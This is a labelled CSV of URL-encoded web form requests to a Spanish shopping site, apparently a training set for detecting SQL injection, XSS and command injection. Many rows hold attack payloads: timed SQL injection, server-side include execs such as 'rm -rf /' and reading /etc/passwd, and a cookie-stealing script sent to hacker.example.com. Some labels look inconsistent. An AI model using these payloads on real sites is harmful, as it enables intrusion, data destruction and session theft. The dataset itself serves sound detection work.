payload,attack_type,label
idA=1,normal,1
ID=%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=torsten&password=quienq%21uier&nombre=Ceciliano&apellidos=De+la+Llave+Graell&email=tambor%40archivodeimagenes.mu&dni=79001087C&direccion=C%2F+Recanto+Da+Mapoula+87+8%3FA&ciudad=Luzaide%2FValcarlos&cp=33610&provincia=Madrid&ntc=3747055026532862%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Registrar123,sqli,1
modo=entrar&login=hanneke%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&pwd=dESHILadIZ&remember=off&B1=Entrar,sqli,1
modo=registro&login=wolfs&password=s093li8n7&nombre=Caridad&apellidos=Borgu%F1o+Bartom%E9u&email=petrie3%40menorca.com.kp&dni=93966067G&direccion=Virgen+De+Los+Imposibles+162%2C+&ciudad=Azuara&cp=37891&provincia=Guadalajara&ntc=1944184387366520&B1=Registrar123,normal,0
errorMsg=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29123,xss,1
errorMsg=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
modo=insertar&precio=4689&B1A=Confirmar,cmdi,1
OpenServer123,normal,1
modo=registro&login=amant&password=a%2Fn%248l%2Fo5%2Ca&nombre=Aleardo&apellidos=Sellares+Brihuega&email=miguel_bridge%40irmedia.nl&dni=15074727K&direccion=Calle+Rodrigo+De+Triana+189%2C+6E&ciudad=Ametlla+del+Vall%E8s%2C+L%27&cp=44597&provincia=Guadalajara&ntc=2988316222731904&B1=Registrar,cmdi,1
modo=registro&login=bose&password=-hatajaDor&nombre=Isolina&apellidos=Cunillera+Penades&email=frankfather%40andrestabernero.dj&dni=64996573E&direccion=C%2F+Lorenzo+Solano+Tendero%2C+S%2FN+8B&ciudad=Peralejos+de+Arriba&cp=02614&provincia=Navarra&ntc=0659755476152636&B1=Registrar,normal,0
b2=%27+delete+from+users,normal,1
errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E123,normal,1
modo=entrar&login=fis%3F%2Cc%2Bhett&pwd=destorpadu%3Fra&remember=off&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
id=3%2F&nombre=Queso+Manchego&precio=100&cantidad=97&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=3010&B1A=Confirmar,cmdi,1
modo=registro&login=hatty&password=eb%FArnea&nombre=Norberto&apellidos=Riu+Riutort&email=demjanenko%40gesautonomos.io&dni=33A75810Q&direccion=Cipriano+De+La+Huerga%2C+45+&ciudad=Fontiveros&cp=05146&provincia=Baleares+%28Illes%29&ntc=6216263942492348&B1=Registrar,cmdi,1
modo=insertar&precio=766&B1=Pasar+por+caja,normal,0
modo=entrar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=roddie9&pwd=2esu1ador3&remember=on&B1=Entrar,sqli,1
modo=entrar&login=gidget&pwd=p5r0i9i5ar&remember=on&b1=entrar,normal,0
modo=insertar&precio=41&B1=Confirmar%2F,cmdi,1
modo=insertar&precio=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Pasar+por+caja123,sqli,1
errorMsg=%4040,normal,1
modo=registro&login=new&password=583opi4&nombre=Donaldo&apellidos=Castell%F3+Sargatal&email=radir%40diagnosticoradiologico.mil&dni=58222899D&direccion=Camino+Hoya+Mondongo%2C+124+&ciudad=Galende&cp=01267&provincia=La+Rioja&ntc=3892784649587009&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=33&B1=A%F1adir+al+carrito,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=entrar&login=diffie&pwd=Cayar%ED&remember=off&B1=Entrar%27INJECTED_PARAM,cmdi,1
B2A=Vaciar+carrito,normal,1
B2=Vaciar+carrito%4040,normal,1
modo=registro&login=servidio&password=em%2bbuchada&nombre=gumersindo&apellidos=salazar+borja&email=walley%40santacruzdelvoto.gg&dni=56597686e&direccion=peso+de+la+harina+174+&ciudad=montorn%e8s+de+segarra&cp=37755&provincia=ciudad+real&ntc=8224727422356159&b1=registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1,normal,0
id=1%2B,normal,1
modo=registro&login=natala&password=d68as4o&nombre=La%EDn&apellidos=Pizorno+Talarn&email=peek%40clubforex.ax&dni=68889499Z&direccion=Calle+Sagristans%2C+132%2C+&ciudad=Guaza+de+Campos&cp=33875&provincia=Burgos&ntc=9469363805920564&B1=Registrar,normal,0
B2=%27INJECTED_PARAM123,normal,1
b2=vaciar+carrito%22+and+%221%22%3d%221,normal,1
B2=Vaciar+carrito,normal,0
modoA=entrar&login=thisner9&pwd=tanganillas&remember=off&B1=Entrar,cmdi,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=32&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=bergland&pwd=85amo&remember=on&B1=Entrar,normal,0
idA=1,normal,1
b2=vACIAR+CARRITOBOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Cal%2Ble+La+Felipa+S%2B%2FN%2C*+12-B&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=shangtia&password=cogotillo&nombre=Tarsila&apellidos=Azc%E1rate+Campalan&email=millot_power%40guejos.sv&dni=19277401C&direccion=Calle+Maria+Marin%2C+196%2C+&ciudad=Veracruz&cp=46724&provincia=Navarra&ntc=5828720454408977&B1=Registrar,normal,0
modo=registro&login=casey&password=parasceve&nombre=Remi%27g%2F*io&apellidos=Montras+Handal&email=mukherjee%40mcfly.cat&dni=75875960H&direccion=Argentina+127%2C+&ciudad=Villaviudas&cp=08254&provincia=Guadalajara&ntc=3976120192503130&B1=Registrar,cmdi,1
modo=registro&login=chi-keun&password=reinazgo&nombre=Farid&apellidos=Chayle+Villablanca&email=batobrina.falkenstein%40ebs-construcciones.sv&dni=73107657H&direccion=C%2F+Aulencia%2C+84+&ciudad=Bellv%EDs&cp=24448&provincia=Valladolid&ntc=6743669195924554&B1=Registrar,normal,0
modo=registro&login=aulakh&password=flota5iento&nombre=Ges%FA&apellidos=Vitriago+Iribe&email=pizani%40unanuevavisionenortodoncia.tg&dni=30097796L&direccion=Purpurania%2C+79+3%3FB&ciudad=Cuacos+de+Yuste&cp=48508&provincia=Sevilla&ntc=5128322398230292&B1=Registrar,normal,0
modo=insertar&precio=8122&B1=Confirmar%2F,cmdi,1
id=any%253f%250aset-cookie%253a%2btamper%253d5765205567234876235,normal,1
id=3&nombre=Queso+Manchego&precio=39&cantidad=71&B1=A%F1adir+al+carrito,normal,0
id=2&nombre=queso+manchego&precio=85&cantidad=12&b1=a%f1adir+al+carrito,normal,0
modo=entrar&login=shihhai0&pwd=ductilidad&remember=on&B1=Entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=registro&login=sainsbur&password=aUsTridA%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&nombre=Deifilia&apellidos=Benedetti+Lozana&email=haddrick_cleary%40esposa.com.mobi&dni=80061275T&direccion=Plza.+Garcia+Alvarez+De+Albornoz%2C+146+&ciudad=Alc%E1zares%2C+Los&cp=41540&provincia=Tarragona&ntc=0932460116452279&B1=Registrar,sqli,1
idA=1123,normal,1
id=2,normal,0
id=1123,normal,0
id=3&nombre=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&precio=85&cantidad=32&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=6922&B1=Confirmar,normal,0
MODO=REGISTRO&LOGIN=BOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG&PASSWORD=CRiN%2baDA&NOMBRE=aLIBERTA&APELLIDOS=gOCHEZ&EMAIL=KUBLER5%40PORQUEAGEL.PS&DNI=49372725m&DIRECCION=cALLE+bARRIO+dE+lA+tORRE+163%2c+&CIUDAD=aLAR+DEL+rEY&CP=22770&PROVINCIA=tOLEDO&NTC=5546440906293369&b1=rEGISTRAR,xss,1
modo=registro&login=mariabel&password=c2645ido&nombre=Zelma&apellidos=Dotor+Fornell&email=celik-regan%40turinga.sb&dni=95113653M&direccion=Carrer+Jaume+D%27artes+78%2C+&ciudad=Osornillo&cp=10411&provincia=Burgos&ntc=3090147546194865&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=entrar&login=mc&pwd=cerverano&remember=off%2F&B1=Entrar,cmdi,1
modo=insertar&precio=7988&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precio=4613&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precio=4932&b1=pasar+por+caja,normal,0
modo=registro&login=dezoete&password=dichoso&nombre=Alenka&apellidos=Ca%F1averal&email=kim%40donkr.yu&dni=08175127F&direccion=Callejon+Gallo+170%2C+11D&ciudad=Baral*la&cp=09592&provincia=Guadalajara&ntc=9286021613970339&B1=Registrar,cmdi,1
id=1,normal,0
ERRORmSG=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
modo=registro&login=basta&password=4or6un0&nombre=Salom%E9&apellidos=Perpi%F1%E0+Izurrieta&email=steinbach%40ballobar.com.tf&dni=64079837C&direccion=Calle+Sant+Joan%2C+123%2C+&ciudad=Muela%2C+La&cp=18452&provincia=Burgos&ntc=0350022340129740&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
id=2%27OR%27a%3D%27a123,normal,1
modo=entrar&login=freeburn&pwd=florar&remember=off%2500&B1=Entrar,cmdi,1
MODO=REGISTRO&LOGIN=STEFANAC&PASSWORD=AUTOINTOXICACI%f3N&NOMBRE=eUDORO&APELLIDOS=vALDERR%e1BANO&EMAIL=MARLEAU%40ROSASERIGRAFIA.NZ&DNI=08475533x&DIRECCION=pL.+eLIO+aNTONIO+dE+nEBRIJA%2c+34+&CIUDAD=sANTA+mAR%edA+DEL+cUBILLO&CP=43740&PROVINCIA=gUADALAJARA&NTC=3535089372971785&b1=rEGISTRAR%3c%21--%23INCLUDE+FILE%3d%22ARCHIVO_SECRETO%22+--%3e,sqli,1
modo=insertar&precio=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Confirmar,xss,1
modo=registro&loginA=cirulli&password=exployada&nombre=Nadini&apellidos=Siset+Marcher&email=hell.nomura%40velazquezlarra%F1aga.am&dni=61186493F&direccion=C%2F+Rafael+Company+%22farmaceutic%22%2C+135%2C+&ciudad=Salas+Altas&cp=01039&provincia=Guadalajara&ntc=9812245040414546&B1=Registrar,cmdi,1
modo=insertar&precio=378&B1=Confirmar,normal,0
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
B2=Vaciar+carrito,normal,0
modo=registro&login=jamshidi&password=2446e8t6da&nombre=gimena&apellidos=ign%e9s+anzoategui&email=docken.carmi%40soyrojo.so&dni=07077546d&direccion=praza+algalia+de+arriba%2c+188%2c+&ciudad=alegr%eda-dulantzi&cp=19196&provincia=alicante&ntc=0398567716677784&b1=registrar,normal,0
modo=entrar&login=skedelsk&pwd=8id4o5%e12ti97&remember=on&b1=entrar,normal,0
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito,normal,0
id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,sqli,1
id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=85&cantidad=17&B1=A%F1adir+al+carrito,sqli,1
modo=registro&login=mcconnel&password=a9m7dr83a&nombre=ara%f3n&apellidos=marqu%e9s&email=mctaggart%40gafa.com.io&dni=45935212a&direccion=calle+general+sanjurjo%2c+s%2fn%2c+12-c&ciudad=villafrech%f3s&cp=45250&provincia=lleida&ntc=8591363958180567&b1=registrar,normal,0
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=entrar&login=obermeie&pwd=to2adora&remember=on&B1=Entrar123,normal,0
modo=entrar%257C&login=bassigna&pwd=recercar&remember=on&B1=Entrar,cmdi,1
id=1&nombre=Queso+Manchego&precio=39%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=94&B1=A%F1adir+al+carrito,sqli,1
B2=Vaciar+carrito123,normal,0
id=2,normal,0
b2=%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e,xss,1
modo=insertar&precio=8656&B1=Confirmar123,normal,0
modo=entrar&login=persaud&pwd=catalineta&remember=off&b1=entrar,normal,0
modo=registro&login=daesik2&password=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Panciano&apellidos=Bonitto+Ciraco&email=dorsay.thursby%40elrincondelmarmol.pr&dni=51834543H&direccion=Cabo+De+Agua%2C+S%2FN+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja%E9n&ntc=8319637256237029&B1=Registrar123,sqli,1
B2A=Vaciar+carrito,normal,1
modo=insertar&precio=7766&B1=Confirmar,normal,0
B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=insertar&precioA=1543&B1=Confirmar,cmdi,1
id=2&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=23&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=hawi&password=suplementero&nombre=Sahid&apellidos=Fajardos+Espuna&email=caster%40videotubo.pr&dni=22134277C&direccion=Calle+Mitjana%2C+83%2C+8B&ciudad=Borox&cp=34306&provincia=Salamanca&ntc=6148304241486263&B1=Registrar,normal,0
modo=entrar&login=kilner&pwdA=GurBiA&remember=off&B1=Entrar,cmdi,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=2426&B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
B2=%7C,normal,1
B2=Vaciar+carrito,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
modo=entrar&login=els&pwd=SUba9taci%D3n&remember=on&B1=Entrar,normal,0
modo=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=20&B1=Pasar+por+caja,cmdi,1
modo=entrar&login=gourley&pwd=sensualmente&remember=off&B1=Entrar,normal,0
modo=insertar&precio=7334&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=elnore&password=aZOem%24IA&nombre=Fredesvinda&apellidos=Bazet+Aguil%F3&email=latimer%40puntodevistafotografia.ve&dni=65358703V&direccion=Vacas+De+San+Juan+153+&ciudad=Ribera+del+Fresno&cp=46177&provincia=Valladolid&ntc=0288508062311799&B1=Registrar123,normal,0
id=3&nombre=Queso+Manchego&precio=85&cantidad=20&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=4005&b1=confirmar,normal,0
b2=vaciar+carrito,normal,0
modo=registro&login=reiner&password=t0na5t44lA&nombre=Lucrecio&apellidos=Jado&email=siku%40tartasconamor.in&dni=67615328C&direccion=De+Las+Aguas%2C+196+&ciudad=Ca%F1ada+del+Hoyo&cp=37427&provincia=M%E1laga&ntc=7666460029738411&B1=Registrar,normal,0
modo=entrar&login=thiel&pwd=simplemente&remember=off&B1=Entrar,normal,0
modo=entrar&login=nean%2Bd%27er&pwd=ventr%F3n&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=niu&pwd=i_nsania&remember=off&B1=Entrar123,normal,0
modo=insertar&precio=6457&B1=Pasar+por+caja%2F,cmdi,1
modo=entrar&loginA=marv&pwd=meitad&remember=off&B1=Entrar,cmdi,1
id=2&nombre=Queso+Manchego&precio=100&cantidad=98&B1=A%F1adir+al+carrito,normal,0
modo=%27+DELETE+FROM+USERS&precio=806&B1=Confirmar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=7285&B1=Confirmar%2F,cmdi,1
modo=registro&login=widuch&password=o7TOp%E9dIca&nombre=Belindo&apellidos=Calet&email=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&dni=54927886E&direccion=Memorial+Nu%F1ez+Blanca+193%2C+&ciudad=Madridanos&cp=37060&provincia=Teruel&ntc=0916374019101201&B1=Registrar,cmdi,1
b2=and+1%3d1,normal,1
id=2,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=jarmo&password=sarmiento&nombre=jahu&apellidos=xaudiera+alicea&email=greggory%40fighting-machines.gl&dni=93611037w&direccion=calle+guatemala+12+11c&ciudad=ferreras+de+arriba&cp=06670&provincia=barcelona&ntc=7380226598430715&b1=registrar,normal,0
modo=insertar&precio=4388&B1A=Pasar+por+caja,cmdi,1
b2=vACIAR+CARRITO%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
modo=entrar&login=lussier&pwd=1Ch%3FU07l6A&remember=off&B1=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29123,xss,1
id=1,normal,0
modo=entrar&login=benji&pwd=6olpeador&remember=off&B1=Entrar,normal,0
id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=88&B1=A%F1adir+al+carrito,cmdi,1
B2=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=insertar&precio=8866&B1=Pasar+por+caja,normal,0
modo=insertar&precio=6541%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Confirmar,sqli,1
id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=58&B1=A%F1adir+al+carrito,cmdi,1
B2A=Vaciar+carrito,normal,1
modo=insertar&precio=1894&B1=Confirmar123,normal,0
id=%2B,normal,1
ID=2&NOMBRE=qUESO+mANCHEGO&PRECIO=100&CANTIDAD=91&b1=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
B2A=Vaciar+carrito123,normal,1
modo=registro&login=derbyshi&password=c2is48s0&nombre=Flori%E1n&apellidos=Canals+Beramendi&email=simon%40sms24h.pg&dni=82301478A&direccion=C%2F+Manresa+56+2-E&ciudad=Tobar&cp=28090&provincia=Valladolid&ntc=8591525161088176&B1=Registrar123,normal,0
modo=entrar&login=lepine&pwd=crioja&remember=off&B1=Entrar123,normal,0
b2=vaciar+carrito,normal,0
id=1%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
B2A=Vaciar+carrito123,normal,1
B2=Vaciar+carrito,normal,0
modo=registro&login=beomsahn&password=voseo&nombre=Andr%F3cies&apellidos=Pistan+Robredo&email=milionario.kirkham%40programa-gestion-erp.mil&dni=71542361X&direccion=Plza.+Pedagogo+Pestalozzi%2C+157%2C+6%3FD&ciudad=Fresno+de+Torote&cp=10650&provincia=Zaragoza&ntc=7689420873127697&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=jovo&password=28l3ra8a&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=10191&provincia=Burgos&ntc=3393638948319901&B1=Registrar%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
id=2&nombre=Vino+Rioja&precio=39any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&cantidad=26&B1=A%F1adir+al+carrito,cmdi,1
id=1&nombre=Queso+Manchego%27OR%27a%3D%27a&precio=39&cantidad=53&B1=A%F1adir+al+carrito,cmdi,1
ID=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c,sqli,1
id=2,normal,0
modo=entrar&login=barnhous&pwd=ip50&remember=on&B1=Entrar,normal,0
modo=registro&login=zauhar&password=deshon7oso&nombre=Allegra&apellidos=N%FA%F1ez&email=griffith_chesbro%40psykoterapeut.sn&dni=84166910C&direccion=Aguila+S%2FN%2C+6-G&ciudad=Castellol%ED&cp=06443&provincia=Vizcaya&ntc=6819239674494837&B1=Registrar123,normal,0
ida=1,normal,1
modo=registro&login=pravato&password=rastrero&nombre=Robustiana&apellidos=Laspiur&emailA=kurz%40kayaalicante.cn&dni=60962318J&direccion=C%2F+Santa+Anna%2C+S%2FN+&ciudad=Villaespasa&cp=26292&provincia=Navarra&ntc=8682803216185712&B1=Registrar,cmdi,1
modo=entrar&login=reiman%22+AND+%221%22%3D%221&pwd=7asto&remember=off&B1=Entrar,cmdi,1
modo=entrar&login=lar&pwd=t2naja&remember=on&B1=Entrar,normal,0
modo=entrar&login=grimshaw&pwd=84m3ri156&rememberA=on&B1=Entrar,cmdi,1
modo=registro&login=shandeig&password=tRaSPiLlA*R&nombre=Jovina&apellidos=Huaripuma+Guisasola&email=lag%40xavipetit.lu&dni=61603039T&direccion=San+Roman+140%2C+2E&ciudad=Puigpunyent&cp=45684&provincia=Zaragoza&ntc=1992808528259508&B1=Registrar123,normal,0
b2=vACIAR+CARRITO%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
MODO=INSERTAR%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PRECIO=2018&b1=pASAR+POR+CAJA,sqli,1
id=2%2F&nombre=Vino+Rioja&precio=39&cantidad=69&B1=A%F1adir+al+carrito,cmdi,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=19&B1=A%F1adir+al+carrito,normal,0
errormsg=credenciales+incorrectas,normal,0
id=2%257C&nombre=Vino+Rioja&precio=85&cantidad=18&B1=A%F1adir+al+carrito,cmdi,1
id=2,normal,0
id=1,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=insertar&precio=6769&B1=Pasar+por+caja,normal,0
modo=registro&login=siu-kwok&password=GrEg%FCescoS&nombre=Hilda&apellidos=Gonzaga+Ripalda&email=shue-sampson%40artroscopiagc.mn&dni=31827013G&direccion=Nuestra+Se%F1ora+De+Las+Angustias+S%2FN%2C+&ciudad=Frigiliana&cp=24232&provincia=Granada&ntc=3823811440410539&B1=Registrar,normal,0
modo=insertar&precio=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Pasar+por+caja,sqli,1
modo=entrar&login=hedrich&pwd=M%2CUL%27%2CSo&remember=off&B1=Entrar,cmdi,1
modo=entrar&login=ness&pwd=juma&remember=on%2F&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=joffe&pwd=A6R91n4&remember=on&B1=Entrar123,normal,0
modo=insertar&precioA=900&B1=Pasar+por+caja,cmdi,1
modo=registro&login=snair&password=morfea&nombre=Apolonio&apellidos=Sall%E0+Mico&email=polo%40familiamarino.bn&dni=46881104C&direccion=Calle+Paloma+101%2C+&ciudad=Carde%F1osa&cp=09110&provincia=Le%F3n&ntc=4138413338105604&B1=Registrar,normal,0
modo=registro&login=combos&password=co3tra3tiv7&nombre=Amine&apellidos=Homs+Breither&email=stapley%40cirugiaplasticacordoba.jm&dni=96110447W&direccion=Fundidores%2C+179%2C+&ciudad=Vilaller&cp=34310&provincia=Valencia&ntc=7693499164739124&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
id=1&nombre=vino+rioja&precio=85&cantidad=1&b1=a%f1adir+al+carrito,normal,0
B2=Vaciar+carrito%252B,normal,1
modo=entrar&login=culham&pwd=g16i7A0a&remember=on&B1=Entrar,normal,0
modo=insertar&precio=2437&B1=Confirmar,normal,0
idA=2,normal,1
id=1&nombre=Queso+Manchego&precio=100&cantidad=19&B1=A%F1adir+al+carrito123,normal,0
id=1&nombre=Queso+Manchego&precio=39&cantidad=59&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,sqli,1
errormsg=credenciales+incorrectas,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
modo=registro&login=severn5&password=02048n3ad1&nombre=eugenio&apellidos=pall%e0s+de+buran&email=walker%40ebaz.vi&dni=88253687l&direccion=calle+playa+del+carmen%2c+178%2c+2%3fd&ciudad=marazuela&cp=45510&provincia=salamanca&ntc=0639487553835350&b1=registrar,normal,0
errorMsg=Credenciales+incorrectas%3F,normal,1
B2=Vaciar+carrito,normal,0
MODO=REGISTRO&LOGIN=COLLINE&PASSWORD=H30I2O&NOMBRE=sYLVINA&APELLIDOS=mATEU+bERNAUS&EMAIL=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&DNI=75667654t&DIRECCION=c%2f+dEL+tORRENT+dE+l%27OLLA%2c+111+11%3fd&CIUDAD=fUERTE+DEL+rEY&CP=49610&PROVINCIA=gUADALAJARA&NTC=5880986678228634&b1=rEGISTRAR,xss,1
B2=Vaciar+carrito123,normal,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=11&B1=A%F1adir+al+carrito,normal,0
ERRORmSG=%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e,sqli,1
modo=registro&login=bartz&password=impunida&nombre=Eliberto&apellidos=Ba%F1os+Peleij%E0&email=luke%40barnizultravioleta.ar&dni=88597573D&direccion=Calle+Albacete%2C+83+paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ciudad=Nevada&cp=28794&provincia=Ourense&ntc=4823016932298784&B1=Registrar123,xss,1
errorMsg=Credenciales+incorrectas,normal,0
id=1&nombre=Queso+Manchego&precio=39&cantidad=96&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=atta1&pwd=cand_ongueo&remember=onparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar123,xss,1
id=1,normal,0
modo=registro&login=mcnerlan&password=c1s92be4e29&nombre=nebila&apellidos=zempoalteca+fuxet&email=dorsch.galani%40lapasteleria.mg&dni=71404358f&direccion=carrer+felix+cucurull%2c+167+3-a&ciudad=santiso&cp=15635&provincia=huesca&ntc=0527381182420490&b1=registrar,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=justino&pwd=caricioso&remember=on&B1=Entrar123,normal,0
modo=registro&login=prissie&password=7u3eo&nombre=Marcelino&apellidos=Gispert&email=moriaty.suchima%40vendomiatico.at&dni=76973319R&direccion=Carrer+Puigterra+De+Dalt%2C+69%2C+&ciudad=Alcal%E1+del+J%FAcar&cp=34477&provincia=Terue%2Bl&ntc=5196721943648454&B1=Registrar,cmdi,1
modo=entrar&login=rashmi&pwd=S134a%2BRe%D1O&remember=on&B1=Entrar,normal,0
